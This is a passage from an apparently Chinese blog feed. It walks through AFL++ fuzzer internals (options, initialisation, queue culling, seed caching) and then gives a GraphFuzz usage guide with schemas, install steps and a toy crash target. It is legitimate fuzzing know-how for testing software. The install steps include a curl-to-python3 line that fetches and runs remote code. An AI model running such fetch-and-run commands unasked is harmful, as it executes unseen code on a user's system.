mode）</td></tr><tr><td><code>-Y</code></td><td>使用VM模糊测试（NYX mode - multiple instances mode）</td></tr><tr><td><code>-g minlength</code></td><td>设置生成模糊测试输入的最小长度（默认1）</td></tr><tr><td><code>-G maxlength</code></td><td>设置生成模糊测试输入的最大长度（默认 1*1024*1024）</td></tr><tr><td><code>-D</code></td><td>启用确定性模糊测试（一个队列仅进行一次）</td></tr><tr><td><span id="-L"><code>-L minutes</code></span></td><td>使用MOpt（imize）模式并设置进入pacemaker模式的时间限制（无新发现的时间），0=立即，-1=立即并进行正常变异</td></tr><tr><td><code>-c program</code></td><td>指定一个编译的二进制来启用CmpLog。如果使用QEMU/FRIDA或模糊测试目标已使用CmpLog编译，那么使用<code>-c 0</code>.</td></tr><tr><td><code>-l cmplog_opts</code></td><td>CmpLog配置值（如“2AT”）：1=小文件， 2=大文件（默认），3=所有文件，A=算法求解，T=transformational求解</td></tr><tr><td><code>-Z</code></td><td>序列队列选择，而不是随机权重</td></tr><tr><td><code>-N</code></td><td>不解除模糊测试文件的链接</td></tr><tr><td><code>-n</code></td><td>无插桩模糊测试（non-instrumented mode）</td></tr><tr><td><code>-x dict_file</code></td><td>模糊器字典</td></tr><tr><td><code>-s seed</code></td><td>为RNG使用一个固定的种子</td></tr><tr><td><code>-V seconds</code></td><td>模糊测试特定的时间之后结束</td></tr><tr><td><code>-E execs</code></td><td>执行一个近似多少次执行后终止模糊测试</td></tr><tr><td><code>-M/-S id</code></td><td>分布式模式，-M auto-sets -D，-Z（使用-d禁用-D）并不进行trimming</td></tr><tr><td><code>-F path</code></td><td>同步到一个外部模糊器队列目录（需要-M，最多可以指定32次）</td></tr><tr><td><code>-T text</code></td><td>在屏幕上展示text banner</td></tr><tr><td><code>-I command</code></td><td>当一个新的crash发现时，执行一个特定的命令或脚本</td></tr><tr><td><code>-C</code></td><td>crash探索模式</td></tr><tr><td><code>-b cpu_id</code></td><td>将模糊测试进程绑定到特定的CPU核心上（0-…）</td></tr><tr><td><code>-e ext</code></td><td>模糊测试输入文件的文件扩展（如果需要的话）</td></tr><tr><td><code>-h</code></td><td>展示选项信息</td></tr></tbody></table><ul><li><code>setup_signal_handlers()</code>设置信号句柄</li><li><code>check_asan_opts()</code>检查asan选项：获取环境变量<code>ASAN_OPTIONS</code>并检查相关选项设置是否正确</li><li>afl-&gt;schedule记录了afl能量调度模式，默认为fast；如果afl-schedule基于fast实现，则需要为其动态分配内存用于记录AFLFast调度信息</li><li><code>check_crash_handling()</code>确保核心转储不会进入一个程序中。</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern<br></code></pre></td></tr></tbody></table></figure><ul><li><p><code>check_cpu_governor()</code>：检查CPU governor，主要检查linux内核CPU调频是否存在问题。</p></li><li><p><code>save_cmdline()</code>：将命令行保存到afl-&gt;orig_cmdline变量中</p></li><li><p><code>check_if_tty</code>：检查是否是tty。具体通过<code>ioctl(1, TIOCGWINSZ, &amp;ws)</code>获取终端信息来判断是否为tty终端</p></li><li><p><code>get_core_count()</code>：获取CPU核心数</p></li><li><p><code>setup_dirs_fds()</code>：创建相关文件描述符</p></li><li><p><code>bind_to_free_cpu()</code>：构建绑定到核心的进程列表</p></li><li><p><code>init_count_class16()</code>：由count_class_lookup8桶构造count_class_lookup16数组</p></li><li><p><code>setup_custom_mutators()</code>：设置用户自定义的变异器，详见<a href="./AFL++%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8.md">AFL++自定义变异器</a></p></li><li><p><code>setup_cmdline_file()</code>：将命令行保存到default/cmdline文件中</p></li><li><p><code>read_testcases()</code>：从输入目录中读取所有测试用例，然后将其放置在队列中</p></li><li><p><code>pivot_inputs()</code>：为输出目录的输入测试用例创建硬链接，选择一个好的名字并将其转移到新队列实体中</p></li><li><p><code>setup_stdio_file()</code>：为模糊测试数据创建输入文件，默认为default/.cur_input，如果包含扩展名，则为default/.cur_input.(扩展名)</p></li><li><p><code>check_binary()</code>：对PATH路径进行搜索来寻找目标二进制，同时确保其不是一个shell脚本，同时检查其是否有一个有效的ELF头并判断是否进行了插桩（通过环境变量<code>__AFL_SHM_ID</code>进行判断）。此外，该函数还检查一些环境变量并设置相关参数</p></li><li><p><code>setup_testcase_shmem()</code>：设置模糊测试输入的共享内存，并通过环境变量<code>__AFL_SHM_FUZZ_ID</code>传递给forkserver</p></li><li><p><code>load_auto()</code>：自动载入生成的extras</p></li><li><p><code>deunicode_extras()</code>：有时候extras中的字符串在内部转化为unicode码，因此模糊测试时需要将看起来像unicode的字符串进行unicode解码操作</p></li><li><p><code>dedup_extras()</code>：从载入的extras中删除重复（在多个文件载入时可能会发生这个问题）</p></li><li><p>将<code>virgin_bits</code>、<code>virgin_tmout</code>和<code>virgin_tmout</code>数组的比特全部设置为1</p></li><li><p><code>perform_dry_run()</code>：对所有测试用例预运行以确保程序按期望那样运行。该操作仅在初始输入阶段完成并只执行一次</p></li><li><p><span id="cullqueue"><code>cull_queue()</code>：精简队列【贪心算法】，通过遍历top_rated[]中的queue实体，提取出能够发现新边的实体，并将其标记为<code>favored</code>。在下次遍历队列时，这些<code>favored</code>实体能够获得更多执行模糊测试的机会。</span></p></li><li><p><code>show_init_stats()</code>：打印出初始状态，如下图所示：</p></li></ul><p><img src="/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/3.png"></p><ul><li><code>save_auto()</code>：自动保存生成的extras</li></ul><hr><h3 id="模糊测试主循环"><a href="#模糊测试主循环" class="headerlink" title="模糊测试主循环"></a>模糊测试主循环</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// main fuzzy loop</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">likely</span>(!afl-&gt;stop_soon)) {<br><span class="hljs-comment">// fuzzing stage</span><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p><a href="#cullqueue"><code>cull_queue()</code></a></p></li><li><p><code>afl-&gt;cycle_schedules</code>为周期更换调度算法的标志，更换调度算法后，需要重新计算队列所有实体的分数</p></li><li><p><code>runs_in_current_cycle</code>为表示当前循环的变量</p></li><li><p><code>create_alias_table()</code>：创建别名表，允许权重随机选择（开销较大）</p><ul><li><code>static inline void *afl_realloc(void **buf, size_t size_needed)</code>：<ul><li>该函数为realloc的一个wrapper，其主要是确保在调用该函数后，buf的真实大小始终 &gt; size_needed，<strong>避免频繁调用realloc</strong>。该buf size使用<strong>指数增长</strong>。</li></ul></li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">afl_alloc_buf</span> {<br>  <span class="hljs-comment">/* The complete allocated size, including the header of len</span><br><span class="hljs-comment">   * AFL_ALLOC_SIZE_OFFSET */</span><br>  <span class="hljs-type">size_t</span> complete_size;<br>  <span class="hljs-comment">/* ptr to the first element of the actual buffer */</span><br>  u8 buf[<span class="hljs-number">0</span>];<br><br>};<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl-&gt;alias_table</code>、<code>afl-&gt;alias_probability</code>为<code>struct afl_alloc_buf</code>型指针，分别表示别名表和相应的概率</li><li>接下来进行一系列的概率计算，其结果更新到<code>afl-&gt;alias_probability</code>中</li></ul></li><li><p><code>select_next_queue_entry()</code>：基于别名采样算法选择下一个队列实体</p></li></ul><h4 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one()"></a>fuzz_one()</h4><ul><li><p>该fuzz_one()函数位于<code>afl-fuzz-one.c</code>中，该函数实际上为一个wrapper，旨在实现MOPT。原始的<code>fuzz_one()</code>函数被重命名为<code>fuzz_one_original()</code></p></li><li><p>这里使用<code>afl-&gt;limit_time_sig</code>参数值进行<code>fuzz_one()</code>函数的分流：</p><ul><li><code>afl-&gt;limit_time_sig</code>由<a href="#-L">-L参数</a>确定，-L参数的<code>minute</code>传递给<code>afl-&gt;limit_time_puppet</code>，该值仅能是0到2000000 或 -1</li><li><code>afl-&gt;limit_time_puppet == -1</code> <span class="github-emoji"><span>➡</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/27a1.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>afl-&gt;limit_time_sig = -1</code> &amp;&amp; <code>afl-&gt;limit_time_sig = 0</code>；否则 <code>afl-&gt;limit_time_sig = 1</code></li></ul><hr><ul><li><pre><code class="c++">/* 伪代码 */if (afl-&gt;limit_time_sig &lt;= 0) { // afl-&gt;limit_time_sig = 0 表示不启用 MOPT    fuzz_one_original();}if (afl-&gt;limit_time_sig != 0) { // 启用 MOPT    if (afl-&gt;limit_time_sig &lt;= 0)  pilot_fuzzing();    else if (afl-&gt;key_module == 1)  core_fuzzing();    else if (afl-&gt;key_module == 2)  pso_updating();}</code></pre></li></ul></li></ul><hr><h4 id="fuzz-one-original"><a href="#fuzz-one-original" class="headerlink" title="fuzz_one_original()"></a>fuzz_one_original()</h4><p>从队列中选择一个实体，并进行一段时间的模糊测试。返回0表示成功进行模糊测试，返回1表示跳过或放弃模糊测试</p><ul><li><p>如果设置了用户自定义的变异器，即<code>afl-&gt;custom_mutators_count = 1</code>，那么用户自定义的变异器将决定跳过哪些测试用例</p></li><li><p>根据<code>afl-&gt;pending_favored</code>标志来判断在队列中是否有新的favored、没有模糊测试过的种子，如果有且当前种子已经被模糊测试过或不是favored，那么有99%概率跳过该种子的模糊测试；如果<code>afl-&gt;pending_favored</code>标志为<code>false</code>，那么如果当前模糊测试为插桩模式、当前种子不是favored且种子队列数&gt;10，如果队列周期大于1且当前种子未进行过模糊测试（新周期内产生的种子，但不是favored的），75%的概率跳过；否则有95%的概率跳过对该种子的模糊测试</p></li><li><p><code>queue_testcase_get()</code>：首先判断是否启用缓存，如果未启用缓存，则从文件中读入数据并返回；否则，判断该测试用例是否已经缓存到内存中，如果已被缓存，则直接从内存中取出即可，否则将该测试用例缓存到内存中，返回指针<code>afl-&gt;queue_cur-&gt;testcase_buf</code>。</p><p>如果当前测试用例无法满足放入缓存的条件（超过缓存缓存大小/超过最大缓存数），则进行<strong>一个自适应缓存冲突算法</strong>，具体来说：</p><ul><li><code>afl-&gt;q_testcase_cache_size</code>：当前种子测试用例缓存大小</li><li><code>afl-&gt;q_testcase_max_cache_size</code>：能够缓存的最大种子测试用例大小</li><li><code>afl-&gt;q_testcase_cache_count</code>：当前已缓存种子个数</li><li><code>afl-&gt;q_testcase_max_cache_entries</code>：能够缓存的最大的种子数</li><li><code>afl-&gt;q_testcase_max_cache_count</code>：当目前为止的最大缓存数</li><li><code>afl-&gt;q_testcase_cache[]</code>：该数组维护了一个已缓存的种子列表</li></ul><p>一共有两种情况，<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 【该操作只进行一次】 是缓存种子数未达到最大种子缓存数，仅仅是缓存空间不够了，那么将缓存的最大种子数<code>q_testcase_max_cache_entries</code>设置为 max(afl-&gt;q_testcase_cache_count, afl-&gt;q_testcase_max_cache_count) + 1，然后重新分配<code>afl-&gt;q_testcase_cache</code>【该数组记录被缓存的种子】的空间（当前缓存种子数/历史最大种子缓存数+2）。在这种情况下，缓存空间溢出，还需要将当前缓存空间的一个或多个缓存替换为当前种子测试用例，见<a href="#case2">情况2</a></p><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 由于测试用例过大，可能不需要这么大的缓存种子数（因为较大的测试用例会很快填充缓存空间），这本身也是一种自适应的缓存配置。</p><p><span id="case2"><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> </span>缓存种子数即将达到了最大种子缓存数（即仅剩下最后一个缓存空位），那么在<code>afl-&gt;q_testcase_cache</code>数组中不是空且不是指向当前种子的位置，释放该种子的缓存，即afl-&gt;q_testcase_cache[tid]<strong>-&gt;testcase_buf</strong>，并更新相关变量值。反复进行上述操作，直到缓存能够放下当前种子为止。</p><p>然后将文件二进制数据读入到<code>q-&gt;testcase_buf</code>，并更新相关变量值。</p></li><li><p><code>calibrate_case()</code>：校准一个新的测试用例，在处理输入目录时完成，以便在早期警告有问题的测试用例，同时在发现新路径时检测变量行为等</p></li><li><p><code>trim_case()</code>：如果是插桩模式、trim_done未进行过且启用了trim，则对测试用例进行修剪操作。修剪操作的目的是尽可能减少输入测试用例的大小，因为测试用例的大小会影响模糊测试的速度。该操作进行指定步长的删除操作，然后将删除后的测试用例进行运行，如果trace_bits相同（删除后的测试用例和原测试用例触发相同的程序状态，但删除后的测试用例具有更小的大小），则将该删除操作写入到测试用例文件中。注：这里需要同时更新缓存的数据。</p></li><li><p><code>calculate_score()</code>：根据执行时间、bitmap大小、handicap（后来者允许运行更长的时间）、种子深度、能量调度（决定factor）、MOPT模式的一些指标等计算种子得分</p></li><li><p><strong>确定性变异阶段</strong>：如果给定了<code>-d</code>，则跳过确定性变异阶段；如果先前已经进行了确定性变异（passed_det=1）或者种子得分满足某个条件[对该种子进行确定性变异性价比不高]，则也需要跳过确定性变异</p></li><li><p>跳过确定性变异后，先执行<strong>用户自定义的变异阶段</strong>，之后进入<strong>havoc阶段</strong>。</p></li><li><p>havoc阶段结束后，可能会进入splice阶段，该阶段由<code>afl-&gt;ready_for_splicing_count(&gt;1)</code>决定，该值在<code>add_to_queue()</code>函数中被更新，当种子大小&gt;4时，<code>afl-&gt;ready_for_splicing_count++</code></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphFuzz使用说明</title>
    <link href="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <url>/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="GraphFuzz使用说明"><a href="#GraphFuzz使用说明" class="headerlink" title="GraphFuzz使用说明"></a>GraphFuzz使用说明</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><ul><li><p>GraphFuzz是一个用于构建结构感知、库API模糊器的实验性框架</p></li><li><p>论文：</p><p>《GraphFuzz: Library API Fuzzing with Lifetime-aware Dataflow Graphs》</p></li><li><p>GraphFuzz包含：</p><ul><li><code>gfuzz</code>：命令行工具用来合成harness</li><li><code>libgraphfuzz</code>：一个运行时图变异引擎</li></ul></li><li><p>文档：<a href="https://hgarrereyn.github.io/GraphFuzz">hgarrereyn.github.io/GraphFuzz</a></p></li></ul><h2 id="2-工作流程"><a href="#2-工作流程" class="headerlink" title="2. 工作流程"></a>2. 工作流程</h2><ul><li><p>需要创建一个模式（**<code>schema</code>**）来描述目标库API</p></li><li><p>模式使用人可读的TAML格式编写，并包含一系列需要进行模糊测试的函数、类和结构体</p><hr><p><strong>schema.yaml</strong>：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">foo(int</span> <span class="hljs-string">x,</span> <span class="hljs-string">int</span> <span class="hljs-string">y,</span> <span class="hljs-string">float</span> <span class="hljs-string">z)</span><br><span class="hljs-attr">Bar:</span><br>    <span class="hljs-attr">methods:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">Bar(Foo</span> <span class="hljs-string">*,</span> <span class="hljs-string">int)</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">~Bar()</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">bar(int</span> <span class="hljs-string">x)</span><br></code></pre></td></tr></tbody></table></figure></li><li><p>在运行时，GraphFuzz将使用不同顺序和不同的参数调用库的API以生成测试用例。最重要的是，GraphFuzz将明确跟踪目标的生命周期，并确保所有测试用例都遵守由模式定义的API规范</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++">{ <span class="hljs-comment">// Example 1</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    Bar *v1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">1000</span>);<br>    v1-&gt;<span class="hljs-built_in">bar</span>(<span class="hljs-number">123</span>);<br>    del v1;<br>    del v0;<br>}<br>{ <span class="hljs-comment">// Example 2</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    del v0;<br>}<br>{ <span class="hljs-comment">// Example 3</span><br>    Foo *v0 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Foo</span>();<br>    v0-&gt;<span class="hljs-built_in">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0.5</span>);<br>    Bar *v1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">1000</span>);<br>    Bar *v2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Bar</span>(v0, <span class="hljs-number">0</span>);<br>    del v2;<br>    del v1;<br>    del v0;<br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p>上述的测试用例将表示为C++源代码。但在GraphFuzz内部，每个测试用例表示为一个<span style="background-color:#ffed99;font-weight:bold">数据流图</span>，该数据流图的顶点表示为函数，边表示为对象之间的依赖。通过这种方式，GraphFuzz无需代码分析或重编译便可执行测试用例；相反，它动态遍历每一个图，调用每个顶点的一个端点</p><p><img src="/2022/06/24/GraphFuzz%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/o1.png"></p></li></ul><h2 id="3-安装GraphFuzz"><a href="#3-安装GraphFuzz" class="headerlink" title="3. 安装GraphFuzz"></a>3. 安装GraphFuzz</h2><ul><li>将源码下载到本地，并安装相关依赖：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/ForAllSecure/GraphFuzz.git<br>$ sudo apt-get install libprotobuf-dev protobuf-compiler python3-venv python3-pip<br>$ curl -sSL https://install.python-poetry.org | python3 -<br>$ <span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>: ** the root path to poetry ** (e.g. /home/chan/.local/bin)<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>libgraphfuzz：</strong></p><ul><li>libgraphfuzz是链接到你的模糊器harness的一个运行时图变异库，其用C++编写并使用标准的CMake进行构建：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> GraphFuzz<br>$ <span class="hljs-built_in">mkdir</span> build<br>$ <span class="hljs-built_in">cd</span> build<br>$ cmake ..<br>$ make<br>$ sudo make install<br></code></pre></td></tr></tbody></table></figure><hr><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>gfuzz：</strong></p><ul><li>gfuzz是一个python命令行工具，用来构建harness文件并执行各种各样其他的功能（如图最小化）。其使用Python编写，使用Poetry来构建系统：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> .. &amp;&amp; <span class="hljs-built_in">cd</span> cli<br>$ poetry build<br>$ poetry <span class="hljs-built_in">export</span> &gt; dist/requirements.txt<br>$ python3 -m pip install -r dist/requirements.txt<br>$ python3 -m pip install ./dist/gfuzz-*.whl<br></code></pre></td></tr></tbody></table></figure><h2 id="4-基本用法"><a href="#4-基本用法" class="headerlink" title="4. 基本用法"></a><span id="basicusage">4. 基本用法</span></h2><ul><li>构建实验测试环境：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install docker-ce docker-ce-cli containerd.io<br>$ <span class="hljs-built_in">cd</span> .. &amp;&amp; <span class="hljs-built_in">cd</span> experiments<br>$ sudo ./build base<br>$ sudo ./build hello_graphfuzz<br>$ sudo ./run hello_graphfuzz<br></code></pre></td></tr></tbody></table></figure><ul><li><code>hello_graphfuzz</code>是一个简单测试项目，其中包含一个简单的C++目标文件<code>lib.h</code>、一个模式配置文件<code>schema.yaml</code></li><li>一个简单的C++目标文件<code>lib.h</code>：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Foo</span>(): <span class="hljs-built_in">buffer</span>(<span class="hljs-number">0</span>) {}<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">char</span> val)</span> </span>{<br>        buffer.<span class="hljs-built_in">push_back</span>(val);<br>    }<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">check</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-keyword">if</span> (buffer.<span class="hljs-built_in">size</span>() &gt;= <span class="hljs-number">4</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">0</span>] == <span class="hljs-string">'F'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">1</span>] == <span class="hljs-string">'U'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">2</span>] == <span class="hljs-string">'Z'</span> &amp;&amp; \<br>            buffer[<span class="hljs-number">3</span>] == <span class="hljs-string">'Z'</span><br>        ) {<br>            __builtin_trap();<br>        }<br>    }<br><span class="hljs-keyword">private</span>:<br>    std::vector&lt;<span class="hljs-type">char</span>&gt; buffer;<br>};<br></code></pre></td></tr></tbody></table></figure><ul><li>在这个目标中，无法创建使用标准<code>LLVMFuzzerTestOneInput</code>类型的单个函数的harness。但你可以按照如下的方法构造一个事实上的API模糊器：</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *Data, <span class="hljs-type">size_t</span> Size)</span> </span>{<br>    Foo foo;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; Size; ++i) {<br>        foo.<span class="hljs-built_in">write</span>(Data[i]);<br>    }<br>    foo.<span class="hljs-built_in">check</span>();<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p>上述类型的harness构造需要一些关于API的域知识，但对模糊器的搜索空间进行了限制。例如，如果一个bug需要在Foo::check之后调用Foo::write或多次调用Foo::check才能触发，那该如何操作？因此上述<span style="background-color:#ffed99;font-weight:bold">基于标准<code>LLVMFuzzerTestOneInput</code>存在局限性</span>，主要的问题是其调用序列不变，因此不能触发更深层次的漏洞。随着API surface的扩大，函数的交互方式也呈指数级增加，生成这些“事实上”的harness变得更加困难。</p></li><li><p>在GraphFuzz中，一个驱动见解是使模糊器引擎根据覆盖率引导变异自行发现<span style="background-color:#ffed99;font-weight:bold">API使用模式</span>：通过定义一个模式，描述我们想要模糊测试的所有API端点，让模糊器构建测试用例。</p></li><li><p>schema.yaml：</p></li></ul><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Foo:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">struct</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">Foo</span><br>  <span class="hljs-attr">headers:</span> [<span class="hljs-string">lib.h</span>]<br>  <span class="hljs-attr">methods:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">~Foo()</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">write(char</span> <span class="hljs-string">val)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">void</span> <span class="hljs-string">check()</span><br></code></pre></td></tr></tbody></table></figure><ul><li><p>该模式描述了一个库API中一个对象<code>struct Foo</code>和四个端点：</p><ul><li><p><code>Foo::Foo()</code>（一个构造函数）</p></li><li><p><code>Foo::~Foo()</code> (一个析构函数)</p></li><li><p><code>Foo::write(char)</code></p></li><li><p><code>Foo::check()</code></p></li></ul></li><li><p>在模式中，仅给出函数签名，但GraphFuzz尝试去推断语义（例如，Foo:Foo是一个构造函数而不是一个方法调用）。在大多数情况下，该推断是完美的；但也确实遇到了对参数有隐含约束的函数或非标准的API结构。因此，GraphFuzz也支持一种更粗略、更灵活的端点声明，称为自定义端点。</p></li></ul><hr><ul><li>接下来，我们使用<code>gfuzz</code>工具去合成实际的C++ harness文件：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Usage: gfuzz gen [lang] [schema] [output directory]</span><br>$ gfuzz gen cpp schema.yaml .<br></code></pre></td></tr></tbody></table></figure><ul><li>这将会产生3个文件：<ul><li><code>fuzz_exec.cpp</code>：主模糊器harness</li><li><code>fuzz_write.cpp</code>：一个镜像harness，用于将数据流图转化为源代码</li><li><code>schema.json</code>：在运行时被GraphFuzz所使用的类型元数据</li></ul></li></ul><p>:happy: 生成文件内容详见<a 